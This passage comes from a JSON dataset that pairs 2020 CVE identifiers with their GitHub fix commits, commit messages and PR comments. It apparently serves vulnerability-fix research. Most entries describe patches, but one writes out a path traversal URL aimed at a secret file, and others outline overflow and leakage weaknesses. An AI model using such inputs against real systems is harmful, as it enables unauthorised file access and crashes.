            "commit_msg": "net: mqtt: Fix packet length decryption\n\nThe standard allows up to 4 bytes of packet length data, while current\nimplementation parsed up to 5 bytes.\n\nAdd additional unit test, which verifies that error is reported in case\nof invalid packet length.\n\nSigned-off-by: Robert Lubos <robert.lubos@nordicsemi.no>",
            "commit_msg_words": 45,
            "other_info": "net: mqtt: Several bugfixes **All checks passed.**\n\n\n\n*Tip: The bot edits this comment instead of posting a new one, so you can check the comment's history to see earlier messages.*",
            "pr_title_words": 4,
            "comments_words": 26,
            "total_other_info_words": 30
        },
        {
            "cve-id": "CVE-2020-6950",
            "commit_url": "https://github.com/eclipse-ee4j/mojarra/commit/cefbb9447e7be560e59da2da6bd7cb93776f7741",
            "commit_msg": "Multiple Path Traversal security issues",
            "commit_msg_words": 5,
            "other_info": "Multiple Path Traversal security issues",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-11095",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/733ee3208306b1ea32697b356c0215180fc3f049",
            "commit_msg": "Fixed invalid access in update_recv_primary_order\n\nCVE-2020-11095 thanks @antonio-morales for finding this.",
            "commit_msg_words": 11,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-4030",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/05cd9ea2290d23931f615c1b004d4b2e69074e27",
            "commit_msg": "Fixed TrioParse and trio_length limts.\n\nCVE-2020-4030 thanks to @antonio-morales for finding this.",
            "commit_msg_words": 12,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-11105",
            "commit_url": "https://github.com/USCiLab/cereal/commit/3e8b9cab82dc4a596dc3bcfe7437946395ad782b",
            "commit_msg": "Store a copy of each serialized shared_ptr within the archive to prevent the shared_ptr to be freed to early.\n\nThe archives use the memory address pointed by the shared_ptr as a\nunique id which must not be reused during lifetime of the archive.\nTherefore, the archives stores a copy of it.\nThis problem was also reported as CVE-2020-11105.",
            "commit_msg_words": 58,
            "other_info": "CVE-2020-11105: Store a copy of each serialized shared_ptr within the archive to prevent the shared_ptr to be freed to early. Looks good, I'm trying to figure out why the Travis CI did not run - will merge after that is sorted. Looks like all checks have passed -- can we get this merged?",
            "pr_title_words": 20,
            "comments_words": 33,
            "total_other_info_words": 53
        },
        {
            "cve-id": "CVE-2020-11002",
            "commit_url": "https://github.com/dropwizard/dropwizard/commit/d5a512f7abf965275f2a6b913ac4fe778e424242",
            "commit_msg": "Disable message interpolation in ConstraintViolations by default (#3208)\n\nDisable message interpolation in ConstraintViolations by default but allow enabling it explicitly with `SelfValidating#escapeExpressions()`.\r\n\r\nAdditionally, `ConstraintViolations` now provides a set of methods which take a map of message parameters for interpolation.\r\nThe message parameters will be escaped by default.\r\n\r\nRefs #3153\r\nRefs #3157",
            "commit_msg_words": 51,
            "other_info": "Disable message interpolation in ConstraintViolations by default LGTM, thanks!",
            "pr_title_words": 7,
            "comments_words": 2,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2020-13881",
            "commit_url": "https://github.com/kravietz/pam_tacplus/commit/4a9852c31c2fd0c0e72fbb689a586aabcfb11cb0",
            "commit_msg": "pam: don't leak TACACS+ secret to journald\n\nIf journald for syslog is used, the journal is going to store everything,\neven DEBUG loglevel messages. Pre-journald logging of system-wide DEBUG\nloglevel could be avoided and is not affected in all cases.\n\nWith journald presence it's probably safe to no longer log sensitive\ndetails at DEBUG level.\n\nFix #149\n\nSigned-off-by: Daniel Gollub <dgollub@att.com>",
            "commit_msg_words": 61,
            "other_info": "pam: don't leak TACACS+ secret to journald",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-13962",
            "commit_url": "https://github.com/mumble-voip/mumble/commit/a48aea18b6c7ee534cd21f7febfe253e31b33eda",
            "commit_msg": "src/murmur/Server.cpp: implement workaround for critical QSslSocket issue\n\nA severe bug was introduced in qt/qtbase@93a803a6de27d9eb57931c431b5f3d074914f693: q_SSL_shutdown() causes Qt to emit \"error()\" from unrelated QSslSocket(s), in addition to the correct one.\n\nThe issue causes Server::connectionClosed() to disconnect random authenticated clients.\n\nThe workaround consists in ignoring a specific OpenSSL error:\n\"Error while reading: error:140E0197:SSL routines:SSL_shutdown:shutdown while in init [20]\"\n\nDefinitely not ideal, but it fixes a critical vulnerability. Details on how to trigger it are deliberately omitted.",
            "commit_msg_words": 74,
            "other_info": "src/murmur/Server.cpp: implement workaround for critical QSslSocket issue Is there plans for an emergency release with this fix? Not really an emergency release, but 1.3.1 is coming up soon anyways. And this fix will be included ;) I guess this commit fix it: https://github.com/qt/qtbase/commit/8907635da59c2ae0e8db01f27b24a841b830e655 Yes, indeed.",
            "pr_title_words": 7,
            "comments_words": 38,
            "total_other_info_words": 45
        },
        {
            "cve-id": "CVE-2020-10023",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/abba6d7774cdd73665e69f6aa45f42439729e414",
            "commit_msg": "shell: utils: Fix buffer overrun in shell_spaces_trim\n\nThe third argument in memmove can possible be greater than remaining\nbuffer size. Just ensuring that memmove will changes bytes only inside\nthe string buffer and nothing else.\n\nSigned-off-by: Flavio Ceolin <flavio.ceolin@intel.com>",
            "commit_msg_words": 39,
            "other_info": "Backport v1.14: shell: utils: Fix buffer overrun in shell_spaces_trim",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2020-15953",
            "commit_url": "https://github.com/dinhvh/libetpan/commit/6068b0fa8310bced874b322b20ac470472c64784",
            "commit_msg": "Detect extra data after STLS response and return error",
            "commit_msg_words": 9,
            "other_info": "Detect extra data after STARTTLS responses in SMTP and POP3 and exit Thank you for helping with it!",
            "pr_title_words": 12,
            "comments_words": 6,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2020-25219",
            "commit_url": "https://github.com/libproxy/libproxy/commit/a83dae404feac517695c23ff43ce1e116e2bfbe0",
            "commit_msg": "Rewrite url::recvline to be nonrecursive\n\nThis function processes network input. It's semi-trusted, because the\nPAC ought to be trusted. But we still shouldn't allow it to control how\nfar we recurse. A malicious PAC can cause us to overflow the stack by\nsending a sufficiently-long line without any '\\n' character.\n\nAlso, this function failed to properly handle EINTR, so let's fix that\ntoo, for good measure.\n\nFixes #134",
            "commit_msg_words": 68,
            "other_info": "Rewrite url::recvline to be nonrecursive",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-11047",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/f5e73cc7c9cd973b516a618da877c87b80950b65",
            "commit_msg": "Fixed #6009: Bounds checks in autodetect_recv_bandwidth_measure_results",
            "commit_msg_words": 6,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2020-36429",
            "commit_url": "https://github.com/open62541/open62541/commit/c800e2987b10bb3af6ef644b515b5d6392f8861d",
            "commit_msg": "fix(json): Check max recursion depth in more places",
            "commit_msg_words": 8,
            "other_info": "Fixes for JSON encoding",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-19858",
            "commit_url": "https://github.com/plutinosoft/Platinum/commit/9a4ceaccb1585ec35c45fd8e2585538fff6a865e",
            "commit_msg": "Fix vulnerability around urls crafter as http://host/../secret.foo (#24)",
            "commit_msg_words": 8,
            "other_info": "Fix path transversal vulnerability Fixes #22",
            "pr_title_words": 4,
            "comments_words": 2,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2020-11088",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/8fa38359634a9910b91719818ab02f23c320dbae",
            "commit_msg": "Fixed oob read in ntlm_read_NegotiateMessage",
            "commit_msg_words": 5,
            "other_info": "Cve again attributed \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4911/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4914/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4915/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4917/",
            "pr_title_words": 3,
            "comments_words": 56,
            "total_other_info_words": 59
        },
        {
            "cve-id": "CVE-2020-24994",
            "commit_url": "https://github.com/libass/libass/commit/6835731c2fe4164a0c50bc91d12c43b2a2b4e799",
            "commit_msg": "parse_tags: don't recurse for nested \\t()\n\nThis fixes https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=4892\n(stack overflow on deeply nested \\t()).\n\nThis is possible because parentheses do not nest and the first ')'\nterminates the whole tag. Thus something like \\t(\\t(\\t(\\t(\\t() can be\nread in a simple loop with no recursion required. Recursion is also\nnot required if the ')' is missing entirely and the outermost \\t(...\nnever ends.\n\nSee https://github.com/libass/libass/pull/296 for more backstory.",
            "commit_msg_words": 68,
            "other_info": "Reduce recursion and improve VSFilter compatibility for nested \\t Generally fine, I guess. Updated: added braces around the `if` body and replaced the `goto` by a `q = p` assignment. Dropping the goto is nice. I have no further comments. Updated again: turns out `end` was being modified when parsing `\\fn`, so the loop ended too early if `\\fn` was followed by anything else. The assertion in `ass_render.c` helped catch this. In the fixed commit, `end` is no longer modified within `parse_tags`. Final update (hopefully) before merging: added changelog entries, expanded the commit message of the recursion commit and mentioned this PR in the commit messages. If the changelog and commit messages look fine to you, I\u2019ll push to `master`.",
            "pr_title_words": 9,
            "comments_words": 111,
            "total_other_info_words": 120
        },
        {
            "cve-id": "CVE-2020-24213",
            "commit_url": "https://github.com/Fluorohydride/ygopro/commit/3587d3bc009ea28eab68cb9ba86a442a4f3c7a3f",
            "commit_msg": "fix CVE-2020-24213",
            "commit_msg_words": 2,
            "other_info": "fix CVE-2020-24213",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2020-26894",
            "commit_url": "https://github.com/livecode/livecode/commit/d8cb11f12c2e196d1d81c4036e60b6f5d74af0a4",
            "commit_msg": "[[ Bug 22942 ]] Ensure the shellcommand defaults to COMSPEC on Windows",
            "commit_msg_words": 12,
            "other_info": "[[ Bug 22942 ]] Ensure the shellcommand defaults to COMSPEC on Windows @livecode-vulcan review ok d8cb11f \ud83d\udc99 review by @runrevmark ok d8cb11f12c2e196d1d81c4036e60b6f5d74af0a4 \ud83d\ude0e test success d8cb11f12c2e196d1d81c4036e60b6f5d74af0a4\n\n* try-community-armv6-android-sdk26_ndk16r15: [success](https://vulcan.livecode.com/builders/try-community-armv6-android-sdk26_ndk16r15/builds/895)\n* try-community-armv7-android-ndk16r15: [success](https://vulcan.livecode.com/builders/try-community-armv7-android-ndk16r15/builds/304)\n* try-community-arm64-android-ndk16r15: [success](https://vulcan.livecode.com/builders/try-community-arm64-android-ndk16r15/builds/304)\n* try-community-x86-android-ndk16r15: [success](https://vulcan.livecode.com/builders/try-community-x86-android-ndk16r15/builds/304)\n* try-community-x86_64-android-ndk16r15: [success](https://vulcan.livecode.com/builders/try-community-x86_64-android-ndk16r15/builds/304)\n* try-community-js-emscripten-sdk1.35: [success](https://vulcan.livecode.com/builders/try-community-js-emscripten-sdk1.35/builds/2421)\n* try-community-universal-ios-iphoneos14.0: [success](https://vulcan.livecode.com/builders/try-community-universal-ios-iphoneos14.0/builds/23)\n* try-community-universal-ios-iphoneos13.5: [success](https://vulcan.livecode.com/builders/try-community-universal-ios-iphoneos13.5/builds/74)\n* try-community-universal-ios-iphonesimulator14.0: [success](https://vulcan.livecode.com/builders/try-community-universal-ios-iphonesimulator14.0/builds/24)\n* try-community-universal-ios-iphonesimulator13.5: [success](https://vulcan.livecode.com/builders/try-community-universal-ios-iphonesimulator13.5/builds/70)\n* try-community-universal-mac-macosx10.9: [success](https://vulcan.livecode.com/builders/try-community-universal-mac-macosx10.9/builds/2448)\n* try-community-x86-linux-debian8: [success](https://vulcan.livecode.com/builders/try-community-x86-linux-debian8/builds/2437)\n* try-community-x86_64-linux-debian8: [success](https://vulcan.livecode.com/builders/try-community-x86_64-linux-debian8/builds/2436)\n* try-community-x86-win32: [success](https://vulcan.livecode.com/builders/try-community-x86-win32/builds/2471)\n* try-community-x86_64-win32: [success](https://vulcan.livecode.com/builders/try-community-x86_64-win32/builds/2411)",
            "pr_title_words": 12,
            "comments_words": 59,
            "total_other_info_words": 71
        },
        {
            "cve-id": "CVE-2020-36148",
            "commit_url": "https://github.com/hoene/libmysofa/commit/fc8370c94f15813126f6e92a8561c796abbbd434",
            "commit_msg": "Added a fix for M=0 and some more null pointer checks (yes, and the address sanitizer)",
            "commit_msg_words": 16,
            "other_info": "Issue 138 zero m # [Codecov](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=h1) Report\n> Merging [#145](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=desc) (fc8370c) into [master](https://codecov.io/gh/hoene/libmysofa/commit/9be98885b3e62693eea66c5f0aebe283613fc646?el=desc) (9be9888) will **increase** coverage by `0.12%`.\n> The diff coverage is `100.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/hoene/libmysofa/pull/145/graphs/tree.svg?width=650&height=150&src=pr&token=DDazpDJ2P0)](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master     #145      +/-   ##\n==========================================\n+ Coverage   85.01%   85.13%   +0.12%     \n==========================================\n  Files          36       36              \n  Lines        3303     3350      +47     \n==========================================\n+ Hits         2808     2852      +44     \n- Misses        495      498       +3     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/hrtf/check.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hydGYvY2hlY2suYw==) | `90.32% <100.00%> (\u00f8)` | |\n| [src/hrtf/loudness.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hydGYvbG91ZG5lc3MuYw==) | `96.29% <100.00%> (+0.14%)` | :arrow_up: |\n| [src/hrtf/tools.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hydGYvdG9vbHMuYw==) | `91.08% <100.00%> (\u00f8)` | |\n| [src/hrtf/kdtree.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hydGYva2R0cmVlLmM=) | `93.10% <0.00%> (-0.71%)` | :arrow_down: |\n| [src/hrtf/easy.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hydGYvZWFzeS5j) | `55.44% <0.00%> (-0.23%)` | :arrow_down: |\n| [src/tests/tools.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL3Rlc3RzL3Rvb2xzLmM=) | `100.00% <0.00%> (\u00f8)` | |\n| [src/tests/json.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL3Rlc3RzL2pzb24uYw==) | `90.79% <0.00%> (+0.05%)` | :arrow_up: |\n| [src/resampler/speex\\_resampler.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL3Jlc2FtcGxlci9zcGVleF9yZXNhbXBsZXIuYw==) | `77.23% <0.00%> (+0.06%)` | :arrow_up: |\n| [src/hrtf/reader.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hydGYvcmVhZGVyLmM=) | `82.75% <0.00%> (+0.07%)` | :arrow_up: |\n| [src/hdf/btree.c](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree#diff-c3JjL2hkZi9idHJlZS5j) | `97.80% <0.00%> (+0.07%)` | :arrow_up: |\n| ... and [19 more](https://codecov.io/gh/hoene/libmysofa/pull/145/diff?src=pr&el=tree-more) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=footer). Last update [83a6643...43ae96c](https://codecov.io/gh/hoene/libmysofa/pull/145?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 4,
            "comments_words": 205,
            "total_other_info_words": 209
        },
        {
            "cve-id": "CVE-2020-9355",
            "commit_url": "https://github.com/danfruehauf/NetworkManager-ssh/commit/5d88cd89795352b5df54cc0ebb6a0076b8c89ee4",
            "commit_msg": "Remove extra options\n\nAfter analyzing some privilege escalation possibilites, it was decided\nit is best to remove extra options",
            "commit_msg_words": 19,
            "other_info": "Remove extra options I understand some people are going to be very unhappy with it. However I hope to add `-L` and `-R` options.\r\n\r\nSee also:\r\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1803499 @lhw This should be urgently deployed. I'll tag it as 1.2.11 @danfruehauf can you please request a CVE as needed for the privilege escalation flaw via https://cveform.mitre.org/ ? @carnil I've requested a CVE ID and will post it here once I've heard back from them. @kobus-v-schoor was there any news on the CVE assignment? @danfruehauf https://bugzilla.redhat.com/show_bug.cgi?id=1803499 is not publicly accessible, possible to open that up? This might be blocking the CVE assignment from MITRE if they have not enough context. CVE-2020-9355 was assigned for this issue. Darn. I can't -D anymore. Is there some way to add this? :( The PR removed the extra options, but left in the README section and the image, giving the false impression this is still supported.\r\n\r\nOn the same topic, I'd really like to have `-L` back, would you be open to merge a very restricted input field that just allows the user to append valid `-L` blocks?",
            "pr_title_words": 3,
            "comments_words": 178,
            "total_other_info_words": 181
        },
        {
            "cve-id": "CVE-2020-11939",
            "commit_url": "https://github.com/ntop/nDPI/commit/7ce478a58b4dd29a8d1e6f4e9df2f778613d9202",
            "commit_msg": "ssh: fixing unsigned overflow leading to heap overflow\n\ncf GHSL-2020-051",
            "commit_msg_words": 10,
            "other_info": "Ghsl 2020 05x Thank you",
            "pr_title_words": 3,
            "comments_words": 2,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-36309",
            "commit_url": "https://github.com/openresty/lua-nginx-module/commit/041d7d1c8539f92062c2a79cf18f550542bccc2e",
            "commit_msg": "bugfix: ensured arguments of APIs mutating uri or request/response headers do not contain unsafe characters.\n\nSigned-off-by: Thibault Charbonnier <thibaultcha@me.com>",
            "commit_msg_words": 19,
            "other_info": "bugfix: ensured arguments of APIs mutating uri or request/response headers do not contain unsafe characters. (Rebased on top of master due to a newly failing tests caused by changes in openresty.org's accepted ciphers) Just pushed an additional commit with more fixes.",
            "pr_title_words": 15,
            "comments_words": 26,
            "total_other_info_words": 41
        },
        {
            "cve-id": "CVE-2020-19860",
            "commit_url": "https://github.com/NLnetLabs/ldns/commit/15d96206996bea969fbc918eb0a4a346f514b9f3",
            "commit_msg": "* bugfix #70: heap Out-of-bound Read vulnerability in\n  rr_frm_str_internal reported by pokerfacett.",
            "commit_msg_words": 12,
            "other_info": "Prepare for 1.8.0 release",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-24716",
            "commit_url": "https://github.com/openzfs/zfs/commit/716b53d0a14c72bda16c0872565dd1909757e73f",
            "commit_msg": "FreeBSD: Fix UNIX permissions checking\n\nReviewed-by: Ryan Moeller <ryan@iXsystems.com>\r\nReviewed-by: Brian Behlendorf <behlendorf1@llnl.gov>\r\nSigned-off-by: Matt Macy <mmacy@FreeBSD.org>\r\nCloses #10727",
            "commit_msg_words": 19,
            "other_info": "FreeBSD: Fix UNIX permissions checking # [Codecov](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=h1) Report\n> Merging [#10727](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=desc) into [master](https://codecov.io/gh/openzfs/zfs/commit/fc34dfba8e8238683e90e3fa83d16be3343886f6&el=desc) will **decrease** coverage by `0.08%`.\n> The diff coverage is `80.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/openzfs/zfs/pull/10727/graphs/tree.svg?width=650&height=150&src=pr&token=NGfxvvG2io)](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master   #10727      +/-   ##\n==========================================\n- Coverage   79.72%   79.63%   -0.09%     \n==========================================\n  Files         394      394              \n  Lines      124665   124666       +1     \n==========================================\n- Hits        99390    99279     -111     \n- Misses      25275    25387     +112     \n```\n\n| Flag | Coverage \u0394 | |\n|---|---|---|\n| #kernel | `80.34% <100.00%> (-0.05%)` | :arrow_down: |\n| #user | `65.10% <0.00%> (-0.70%)` | :arrow_down: |\n\nFlags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags#carryforward-flags-in-the-pull-request-comment) to find out more.\n\n| [Impacted Files](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [module/zfs/arc.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy9hcmMuYw==) | `89.52% <66.66%> (+<0.01%)` | :arrow_up: |\n| [module/zfs/zfs\\_fuid.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy96ZnNfZnVpZC5j) | `14.85% <100.00%> (\u00f8)` | |\n| [module/os/linux/spl/spl-zlib.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL29zL2xpbnV4L3NwbC9zcGwtemxpYi5j) | `55.35% <0.00%> (-28.58%)` | :arrow_down: |\n| [cmd/zvol\\_id/zvol\\_id\\_main.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-Y21kL3p2b2xfaWQvenZvbF9pZF9tYWluLmM=) | `76.31% <0.00%> (-5.27%)` | :arrow_down: |\n| [module/zfs/vdev\\_removal.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy92ZGV2X3JlbW92YWwuYw==) | `94.40% <0.00%> (-3.20%)` | :arrow_down: |\n| [module/zfs/vdev\\_rebuild.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy92ZGV2X3JlYnVpbGQuYw==) | `93.69% <0.00%> (-2.83%)` | :arrow_down: |\n| [module/icp/api/kcf\\_mac.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL2ljcC9hcGkva2NmX21hYy5j) | `37.14% <0.00%> (-1.72%)` | :arrow_down: |\n| [module/zfs/vdev\\_indirect\\_mapping.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy92ZGV2X2luZGlyZWN0X21hcHBpbmcuYw==) | `97.10% <0.00%> (-1.45%)` | :arrow_down: |\n| [module/zfs/zap\\_micro.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy96YXBfbWljcm8uYw==) | `85.35% <0.00%> (-1.26%)` | :arrow_down: |\n| [module/zfs/spa\\_log\\_spacemap.c](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree#diff-bW9kdWxlL3pmcy9zcGFfbG9nX3NwYWNlbWFwLmM=) | `91.97% <0.00%> (-1.15%)` | :arrow_down: |\n| ... and [46 more](https://codecov.io/gh/openzfs/zfs/pull/10727/diff?src=pr&el=tree-more) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=footer). Last update [9352d8c...c2a93c3](https://codecov.io/gh/openzfs/zfs/pull/10727?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 5,
            "comments_words": 245,
            "total_other_info_words": 250
        },
        {
            "cve-id": "CVE-2020-26945",
            "commit_url": "https://github.com/mybatis/mybatis-3/commit/9caf480e05c389548c9889362c2cb080d728b5d8",
            "commit_msg": "Output warning when deserializing object stream with no JEP-290 filter defined",
            "commit_msg_words": 11,
            "other_info": "Output warning when deserializing object stream  if the `LookAheadObjectInputStream` has been removed , will it affect the functionality of earlier version\uff1flike the `blacklist`. Thank you for the feedback, @nothingzhl !\r\n\r\nThis change won't break anything if that is what you mean.\r\nYou just need to setup the JEP-290 filter by yourself (using whitelist approach, preferably) to protect your application instead of relying on the built-in blacklist filter.",
            "pr_title_words": 6,
            "comments_words": 61,
            "total_other_info_words": 67
        },
        {
            "cve-id": "CVE-2020-36177",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/fb2288c46dd4c864b78f00a47a364b96a09a5c0f",
            "commit_msg": "RSA-PSS: Handle edge case with encoding message to hash\n\nWhen the key is small relative to the digest (1024-bit key, 64-byte\nhash, 61-byte salt length), the internal message to hash is larger than\nthe output size.\nAllocate a buffer for the message when this happens.",
            "commit_msg_words": 45,
            "other_info": "RSA-PSS: Handle edge case with encoding message to hash",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2020-18831",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/20a13f00e2db24c58ee326e4c89a56469718b30e",
            "commit_msg": "Add better bounds checking in PngImage::printStructure().",
            "commit_msg_words": 6,
            "other_info": "Add better bounds checking in PngImage::printStructure() Huh. It looks like the tests are failing in release builds due to this error message:\r\n\r\n```\r\nexiv2: Action not available in Release mode: 'R'\r\n```\r\n\r\nWhat's the best way to fix the test? Just change the command line argument to something similar like `-pS`? I see that other tests for `-pR` use `@unittest.skip`, so I added that. # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=h1) Report\n> Merging [#862](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=desc) into [0.27-maintenance](https://codecov.io/gh/Exiv2/exiv2/commit/109d5df7abd329f141b500c92a00178d35a6bef3?src=pr&el=desc) will **increase** coverage by `<.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/862/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=tree)\n\n```diff\n@@                 Coverage Diff                 @@\n##           0.27-maintenance    #862      +/-   ##\n===================================================\n+ Coverage             62.89%   62.9%   +<.01%     \n===================================================\n  Files                   156     156              \n  Lines                 21584   21588       +4     \n===================================================\n+ Hits                  13575   13579       +4     \n  Misses                 8009    8009\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/pngimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/862/diff?src=pr&el=tree#diff-c3JjL3BuZ2ltYWdlLmNwcA==) | `81.08% <100%> 